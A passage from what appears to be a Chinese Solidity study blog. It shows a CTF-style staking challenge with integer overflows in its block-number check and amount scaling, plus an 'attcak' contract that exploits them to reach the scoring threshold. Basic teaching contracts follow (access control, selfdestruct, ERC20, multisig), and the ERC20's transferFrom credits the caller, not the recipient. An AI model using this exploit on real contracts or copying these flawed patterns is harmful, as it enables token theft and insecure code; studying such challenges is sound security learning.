class="string">&quot;withdraw&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//RULE 2</span></span><br><span class="line">    bytes32 constant RULE_NONE_WANT = keccak256(abi.encodePacked(<span class="string">&quot;depositByValue&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        _mint(msg.sender,<span class="number">10000000</span>*<span class="number">10</span>**<span class="number">18</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">depositByWant</span><span class="params">(uint amount)</span>external payable&#123;</span><br><span class="line">        <span class="comment">// uint amount = _amount.mul(10**18);</span></span><br><span class="line">        require(msg.value&gt;=amount,<span class="string">&quot;you want to trick me?&quot;</span>);</span><br><span class="line">        MkaheChange(msg.sender,amount,RULE_NONE_WANT);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">withdraw</span><span class="params">(uint amount)</span>external payable <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>&#123;</span><br><span class="line">        <span class="comment">// uint amount = _amount.mul(10**18);</span></span><br><span class="line">        require(balanceOf(msg.sender)&gt;=amount);</span><br><span class="line">        _balances[msg.sender] = _balances[msg.sender].sub(amount);</span><br><span class="line">        <span class="keyword">return</span> MkaheChange(msg.sender,amount,RULE_WITHDRAW_WANT);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">MkaheChange</span><span class="params">(address to,uint amount,bytes32 ID)</span>internal <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(ID==RULE_NONE_WANT)</span><br><span class="line">        &#123;</span><br><span class="line">            _balances[msg.sender]=_balances[msg.sender].add(amount);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(ID==RULE_WITHDRAW_WANT)&#123;</span><br><span class="line">            <span class="type">bool</span> a;</span><br><span class="line">            (a,)=payable(to).call.value(amount)(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            require(a,<span class="string">&quot;withdraw fail&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fallback()external payable&#123;</span><br><span class="line">        MkaheChange(</span><br><span class="line">            msg.sender,</span><br><span class="line">            msg.value,</span><br><span class="line">            RULE_NONE_WANT</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract stakepool&#123;</span><br><span class="line">    ZT public token;</span><br><span class="line">    uint  totalsupply;</span><br><span class="line">    <span class="built_in">string</span> symbol;</span><br><span class="line">    mapping(address=&gt;uint)internal workbalance;</span><br><span class="line">    mapping(address=&gt;<span class="type">bool</span>)internal passed;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userInfo</span>&#123;</span></span><br><span class="line">        uint amount;</span><br><span class="line">        uint duration;</span><br><span class="line">        uint startTime;</span><br><span class="line">    &#125;</span><br><span class="line">    mapping(address=&gt;userInfo)internal userDetails;</span><br><span class="line"></span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        token =new ZT();</span><br><span class="line">        symbol = <span class="string">&quot;cuit&quot;</span>;</span><br><span class="line">        totalsupply = token.balanceOf(address(this));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">getDetails</span><span class="params">(address account)</span>public view <span class="title function_">returns</span><span class="params">(userInfo memory)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userDetails[account];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">workBalanceOf</span><span class="params">(address account)</span>public view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="type">bool</span> pass=passed[account];</span><br><span class="line">        <span class="keyword">if</span>(pass)&#123;</span><br><span class="line">            <span class="keyword">return</span> workbalance[account];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">Zt</span><span class="params">()</span>public view <span class="title function_">returns</span><span class="params">(address)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address(token);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">stake</span><span class="params">(uint amount,uint blocknumber)</span>external&#123;</span><br><span class="line">        require(blocknumber&gt;=<span class="number">1</span>,<span class="string">&quot;At least 1 block&quot;</span>);</span><br><span class="line"></span><br><span class="line">        userInfo storage user = userDetails[msg.sender];</span><br><span class="line"></span><br><span class="line">        user.startTime = block.number;</span><br><span class="line">        user.duration = blocknumber;</span><br><span class="line">        user.amount += amount;</span><br><span class="line">        passed[msg.sender] = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        token.transferFrom(msg.sender,address(this),amount*<span class="number">10</span>**<span class="number">18</span>);</span><br><span class="line">        workbalance[msg.sender] += blocknumber;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">unstake</span><span class="params">()</span>external&#123;</span><br><span class="line">        userInfo storage user = userDetails[msg.sender];</span><br><span class="line">        require(block.number&gt;=user.startTime+user.duration,<span class="string">&quot;you are in a hurry &quot;</span>);</span><br><span class="line">        passed[msg.sender] = <span class="literal">true</span>;</span><br><span class="line">        uint amount = user.amount;</span><br><span class="line">        user.amount = <span class="number">0</span>;</span><br><span class="line">        token.transfer(msg.sender,amount*<span class="number">10</span>**<span class="number">18</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">swap</span><span class="params">(uint amount)</span>external&#123;</span><br><span class="line">        uint balance = workBalanceOf(msg.sender);</span><br><span class="line">        require(balance&gt;=amount,<span class="string">&quot;exceed&quot;</span>);</span><br><span class="line">        workbalance[msg.sender] -= amount;</span><br><span class="line">        token.transfer(msg.sender,amount*<span class="number">10</span>**<span class="number">18</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract check is stakepool&#123;</span><br><span class="line">    uint256 public score;</span><br><span class="line">    function <span class="title function_">isCompleted</span><span class="params">()</span>public&#123;</span><br><span class="line">        score=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (getDetails(msg.sender).amount&gt;<span class="number">5000000</span> ether)&#123;</span><br><span class="line">            score+=<span class="number">25</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (token.balanceOf(msg.sender)&gt;<span class="number">500000</span> ether)&#123;</span><br><span class="line">            score+=<span class="number">75</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>漏洞在</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这里可以溢出，因此造成漏洞</span><br><span class="line">block.number&gt;=user.startTime+user.duration</span><br><span class="line">这里也可以溢出，因此也有漏洞</span><br><span class="line">token.transferFrom(msg.sender,address(this),amount*<span class="number">10</span>**<span class="number">18</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>攻击</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//溢出</span></span><br><span class="line">contract attcak&#123;</span><br><span class="line">    uint a=<span class="number">2</span>**<span class="number">256</span><span class="number">-1</span>;</span><br><span class="line">    uint public blocknumber;</span><br><span class="line">    ZT public token;</span><br><span class="line">    check public target;</span><br><span class="line">    constructor(address addr,address payable _token)public&#123;</span><br><span class="line">        target=check(addr);</span><br><span class="line">        token=ZT(_token);</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">Attack1</span><span class="params">()</span>public&#123;</span><br><span class="line">        blocknumber=a-block.number+<span class="number">1</span>;</span><br><span class="line">        target.stake(<span class="number">0</span>,blocknumber);</span><br><span class="line">        target.unstake();</span><br><span class="line">        target.swap(<span class="number">5500001</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">Attack2</span><span class="params">()</span>public&#123;</span><br><span class="line">        token.approve(address(target),<span class="number">5000000</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">Attack3</span><span class="params">()</span>public&#123;</span><br><span class="line">        target.stake(a/<span class="number">10</span>**<span class="number">18</span>+<span class="number">1</span>,<span class="number">9</span>);</span><br><span class="line">        target.isCompleted();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -solidity学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>solidity基础知识点（三）</title>
      <link href="/2022/12/01/solidity/%E6%9D%82%E4%B9%B1/%EF%BC%88%E4%B8%89%EF%BC%89solidity%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2022/12/01/solidity/%E6%9D%82%E4%B9%B1/%EF%BC%88%E4%B8%89%EF%BC%89solidity%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="solidity基础知识点（三）"><a href="#solidity基础知识点（三）" class="headerlink" title="solidity基础知识点（三）"></a>solidity基础知识点（三）</h1><h2 id="权限控制合约"><a href="#权限控制合约" class="headerlink" title="权限控制合约"></a>权限控制合约</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">contract AccessControl&#123;</span><br><span class="line">    event <span class="title function_">GrandRole</span><span class="params">(bytes32 indexed role,address indexed account)</span>;</span><br><span class="line">    event <span class="title function_">RevokeRole</span><span class="params">(bytes32 indexed role,address indexed account)</span>;</span><br><span class="line">    <span class="comment">//role=&gt;account=&gt;bool</span></span><br><span class="line">    mapping(bytes32 =&gt; mapping(address =&gt; <span class="type">bool</span>))public roles;</span><br><span class="line">    <span class="comment">//字符串的gas消耗比bytes32哈希的消耗要多的多</span></span><br><span class="line">    bytes32 private constant ADMIN=keccak256(abi.encodePacked(<span class="string">&quot;ADMIN&quot;</span>));</span><br><span class="line">    bytes32 private constant USER=keccak256(abi.encodePacked(<span class="string">&quot;USER&quot;</span>));</span><br><span class="line">    modifier <span class="title function_">onlyRole</span><span class="params">(bytes32 _role)</span>&#123;</span><br><span class="line">        require(roles[_role][msg.sender],<span class="string">&quot;not dauthorized&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    constructor()&#123;<span class="comment">//给其实账户管理员权限</span></span><br><span class="line">        _grandRole(ADMIN,msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">    function _grandRole(bytes32 _role,address _account)internal&#123;<span class="comment">//_role为ADMIN与USER</span></span><br><span class="line">        roles[_role][_account]=<span class="literal">true</span>;<span class="comment">//内部给账户权力的源代码</span></span><br><span class="line">        emit <span class="title function_">GrandRole</span><span class="params">(_role,_account)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">grandRole</span><span class="params">(bytes32 _role,address _account)</span>external <span class="title function_">onlyRole</span><span class="params">(ADMIN)</span>&#123;</span><br><span class="line">        _grandRole(_role,_account);<span class="comment">//赋予账户权限</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">revokeRole</span><span class="params">(bytes32 _role,address _account)</span>external <span class="title function_">onlyRole</span><span class="params">(ADMIN)</span>&#123;</span><br><span class="line">        roles[_role][_account]=<span class="literal">false</span>;<span class="comment">//撤销账户权限</span></span><br><span class="line">        emit <span class="title function_">RevokeRole</span><span class="params">(_role,_account)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="自毁函数"><a href="#自毁函数" class="headerlink" title="自毁函数"></a>自毁函数</h2><p><strong>可实现强制发送主币给地址</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">contract Kill&#123;</span><br><span class="line">    constructor()payable&#123;&#125;</span><br><span class="line">    function <span class="title function_">kill</span><span class="params">()</span>external&#123;</span><br><span class="line">        selfdestruct(payable(msg.sender));<span class="comment">//必须以payable标记的地址</span></span><br><span class="line">        &#125;</span><br><span class="line">        function <span class="title function_">testCall</span><span class="params">()</span>external pure <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">123</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Helper&#123;<span class="comment">//通过这个合约来调用自毁合约</span></span><br><span class="line">    function <span class="title function_">getBalance</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">kill</span><span class="params">(Kill _kill)</span>external&#123;</span><br><span class="line">        _kill.kill();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="小猪存钱罐"><a href="#小猪存钱罐" class="headerlink" title="小猪存钱罐"></a>小猪存钱罐</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract PiggyBank&#123;</span><br><span class="line">    event <span class="title function_">Deposit</span><span class="params">(uint amount)</span>;</span><br><span class="line">    event <span class="title function_">Withdraw</span><span class="params">(uint amount)</span>;</span><br><span class="line">    address public owner=msg.sender;</span><br><span class="line">    receive()external payable&#123;</span><br><span class="line">        emit <span class="title function_">Deposit</span><span class="params">(msg.value)</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">withdraw</span><span class="params">()</span>external &#123;</span><br><span class="line">        require(msg.sender==owner,<span class="string">&quot;not owner&quot;</span>);</span><br><span class="line">        emit <span class="title function_">Withdraw</span><span class="params">(address(this).balance)</span>;</span><br><span class="line">        selfdestruct(payable(msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ERC20"><a href="#ERC20" class="headerlink" title="ERC20"></a>ERC20</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">interface IERC20&#123;</span><br><span class="line">    function <span class="title function_">totalSupply</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>;<span class="comment">//代表token总量</span></span><br><span class="line">    function <span class="title function_">balanceOf</span><span class="params">(address account)</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>;<span class="comment">//代表某一账户的余额</span></span><br><span class="line">    function <span class="title function_">transfer</span><span class="params">(address recipient,uint amount)</span>external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>;<span class="comment">//由当前调用者发送</span></span><br><span class="line">    function <span class="title function_">allowance</span><span class="params">(address owner,address spender)</span><span class="comment">//查看批准额度</span></span><br><span class="line">        external view <span class="title function_">returns</span><span class="params">(uint)</span>;</span><br><span class="line">    function <span class="title function_">approve</span><span class="params">(address spender,uint amount)</span>external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>;<span class="comment">//批准账户额度</span></span><br><span class="line">    function <span class="title function_">transferFrom</span><span class="params">(address sender,address recipient,uint amount)</span></span><br><span class="line">        external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>;</span><br><span class="line">    event <span class="title function_">Transfer</span><span class="params">(address indexed from,address indexed to,uint amount)</span>;</span><br><span class="line">    event <span class="title function_">Approval</span><span class="params">(address indexed owner,address indexed spender,uint amount)</span>;</span><br><span class="line">&#125;</span><br><span class="line">contract ERC20 is IERC20&#123;</span><br><span class="line">    uint public totalSupply;</span><br><span class="line">    mapping(address =&gt;uint)public balanceOf;</span><br><span class="line">    mapping(address=&gt;mapping(address=&gt;uint))public allowance;</span><br><span class="line">    <span class="built_in">string</span> public name=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="built_in">string</span> public symbol=<span class="string">&quot;TEST&quot;</span>;</span><br><span class="line">    uint public decimals=<span class="number">18</span>;</span><br><span class="line">    function <span class="title function_">transfer</span><span class="params">(address recipient,uint amount )</span>external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>&#123;</span><br><span class="line">        balanceOf[msg.sender]-=amount;</span><br><span class="line">        balanceOf[recipient]+=amount;</span><br><span class="line">        emit <span class="title function_">Transfer</span><span class="params">(msg.sender,recipient,amount)</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">approve</span><span class="params">(address spender,uint amount)</span>external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>&#123;</span><br><span class="line">        allowance[msg.sender][spender]=amount;</span><br><span class="line">        emit <span class="title function_">Approval</span><span class="params">(msg.sender,spender,amount)</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">transferFrom</span><span class="params">(address sender,address recipient,uint amount)</span></span><br><span class="line">        external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>&#123;</span><br><span class="line">            allowance[sender][msg.sender]-=amount;</span><br><span class="line">            balanceOf[sender]-=amount;</span><br><span class="line">            balanceOf[msg.sender]+=amount;</span><br><span class="line">            emit <span class="title function_">Transfer</span><span class="params">(sender,recipient,amount)</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    function <span class="title function_">mint</span><span class="params">(uint amount)</span>external&#123;</span><br><span class="line">        balanceOf[msg.sender]+=amount;</span><br><span class="line">        totalSupply+=amount;</span><br><span class="line">        emit <span class="title function_">Transfer</span><span class="params">(address(<span class="number">0</span>),msg.sender,amount)</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    function <span class="title function_">burn</span><span class="params">(uint amount)</span>external&#123;</span><br><span class="line">        balanceOf[msg.sender]-=amount;</span><br><span class="line">        totalSupply-=amount;</span><br><span class="line">        emit <span class="title function_">Transfer</span><span class="params">(msg.sender,address(<span class="number">0</span>),amount)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="多签钱包"><a href="#多签钱包" class="headerlink" title="多签钱包"></a>多签钱包</h2><p><strong>多个人同意之后才能转账</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">contract MultiSigWallet&#123;</span><br><span class="line">    event <span class="title function_">Deposit</span><span class="params">(address indexed sender,uint amount)</span>;</span><br><span class="line">    event <span class="title function_">Submit</span><span class="params">(uint indexed txId)</span>;<span class="comment">//提交交易申请,txId表示交易数组的索引</span></span><br><span class="line">    event <span class="title function_">Approve</span><span class="params">(address indexed owner,uint indexed txId)</span>;<span class="comment">//多次批准</span></span><br><span class="line">    event <span class="title function_">Revoke</span><span class="params">(address indexed owner,uint indexed txId)</span>;<span class="comment">//撤销批准</span></span><br><span class="line">    event <span class="title function_">Execute</span><span class="params">(uint indexed txId)</span>;<span class="comment">//执行</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Transaction</span>&#123;</span><span class="comment">//交易的数据</span></span><br><span class="line">        address to;</span><br><span class="line">        uint value;</span><br><span class="line">        bytes data;</span><br><span class="line">        <span class="type">bool</span> executed;<span class="comment">//是否被执行过</span></span><br><span class="line">    &#125;</span><br><span class="line">    address[]public owners;</span><br><span class="line">    mapping(address=&gt;<span class="type">bool</span>)public isOwner;</span><br><span class="line">    uint public required;</span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">onlyOwner</span><span class="params">()</span>&#123;</span><br><span class="line">        require(isOwner[msg.sender],<span class="string">&quot;not owner&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    modifier <span class="title function_">txExists</span><span class="params">(uint _txId)</span>&#123;<span class="comment">//该交易id是否存在，需要存在</span></span><br><span class="line">        require(_txId&lt;transactions.length,<span class="string">&quot;tx does not exist&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    modifier <span class="title function_">notApproved</span><span class="params">(uint _txId)</span>&#123;<span class="comment">//该批准人是否已经批准，需未批准</span></span><br><span class="line">        require(!approved[_txId][msg.sender],<span class="string">&quot;tx already approved&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    modifier <span class="title function_">notExecuted</span><span class="params">(uint _txId)</span>&#123;<span class="comment">//该交易是否被执行过，需要未交易</span></span><br><span class="line">        require(!transactions[_txId].executed,<span class="string">&quot;tx already executed&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Transaction[]public transactions;<span class="comment">//记录所有交易</span></span><br><span class="line">    <span class="comment">//某一个交易id下某一个签名人的地址是否批准这次交易</span></span><br><span class="line"></span><br><span class="line">    mapping(uint =&gt;mapping(address=&gt;<span class="type">bool</span>))public approved;</span><br><span class="line"></span><br><span class="line">    constructor(address[]memory _owners,uint _required)&#123;</span><br><span class="line">        require(_owners.length&gt;<span class="number">0</span>,<span class="string">&quot;owners required&quot;</span>);<span class="comment">//人的个数要大于零</span></span><br><span class="line">        <span class="comment">//最少批准人的个数大于零，且小于总人数</span></span><br><span class="line">        require(_required&gt;<span class="number">0</span>&amp;&amp;_required&lt;=_owners.length,<span class="string">&quot;failed&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(uint i;i&lt;_owners.length;i++)&#123;</span><br><span class="line">            address owner=_owners[i];</span><br><span class="line">            require(owner!=address(<span class="number">0</span>),<span class="string">&quot;invalid owner&quot;</span>);<span class="comment">//检查地址是否存在</span></span><br><span class="line">            require(!isOwner[owner],<span class="string">&quot;owner is not unique&quot;</span>);<span class="comment">//检查是否重复</span></span><br><span class="line">            isOwner[owner]=<span class="literal">true</span>;</span><br><span class="line">            owners.push(owner);</span><br><span class="line">        &#125;</span><br><span class="line">        required=_required;</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     receive()external payable&#123;</span><br><span class="line">            emit <span class="title function_">Deposit</span><span class="params">(msg.sender,msg.value)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">submit</span><span class="params">(address _to,uint _value,bytes calldata _data)</span></span><br><span class="line">        external onlyOwner&#123;<span class="comment">//此函数来提交交易数据</span></span><br><span class="line">            transactions.push(Transaction(&#123;</span><br><span class="line">                to: _to,</span><br><span class="line">                value: _value,</span><br><span class="line">                data: _data,</span><br><span class="line">                executed:<span class="literal">false</span></span><br><span class="line">            &#125;));</span><br><span class="line">            emit <span class="title function_">Submit</span><span class="params">(transactions.length<span class="number">-1</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">approve</span><span class="params">(uint _txId)</span></span><br><span class="line">        external onlyOwner</span><br><span class="line">        <span class="title function_">txExists</span><span class="params">(_txId)</span><span class="comment">//判断交易id是否存在</span></span><br><span class="line">        <span class="title function_">notApproved</span><span class="params">(_txId)</span><span class="comment">//判断这个签名人是否已经批准过了</span></span><br><span class="line">        <span class="title function_">notExecuted</span><span class="params">(_txId)</span><span class="comment">//判断这个交易id是否执行过了</span></span><br><span class="line">    &#123;</span><br><span class="line">        approved[_txId][msg.sender]=<span class="literal">true</span>;</span><br><span class="line">        emit <span class="title function_">Approve</span><span class="params">(msg.sender,_txId)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//用来记录有多少人批准</span></span><br><span class="line">    function _getApproveCount(uint _txId)private view <span class="title function_">returns</span><span class="params">(uint count)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(uint 